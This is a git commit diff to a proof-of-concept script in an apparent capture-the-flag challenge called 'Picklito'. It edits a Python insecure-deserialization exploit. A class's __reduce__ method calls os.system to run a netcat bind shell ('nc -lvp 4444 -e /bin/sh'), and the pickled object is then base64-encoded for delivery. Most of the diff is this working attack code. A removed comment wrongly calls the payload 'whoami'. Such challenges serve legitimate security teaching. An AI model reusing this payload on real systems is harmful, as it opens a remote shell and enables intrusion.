d0287581c5f7165b49346845a9dd96c61fc6223f
Minh Giang <giangm@sheridancollege.ca>
2023-07-10 22:43:41 -0400

    updates to challenge

--- Challenges/Picklito/documentation/poc.py
+++ Challenges/Picklito/documentation/poc.py
@@ -6,19 +6,12 @@ from flask import Flask, render_template, request, redirect, url_for
 
 app = Flask(__name__)
 
-# 1. creating an Evil class which has our malicious payload command ('whoami')
 class Pickleicious:
     def __reduce__(self):
         return (os.system, ('nc -lvp 4444 -e /bin/sh',))
 
-# 2. serializing the malicious class
 pickle_data = pickle.dumps(Pickleicious())
 
-# storing the serialized output into a file in the current directory
-with open("backup.data", "wb") as file:
-    file.write(pickle_data)
-
-# 3. reading the malicious serialized data and de-serializing it
 with open("backup.data", "rb") as file:
     pickle_data = file.read()
     encoded_data = base64.b64encode(pickle_data).decode('utf-8')
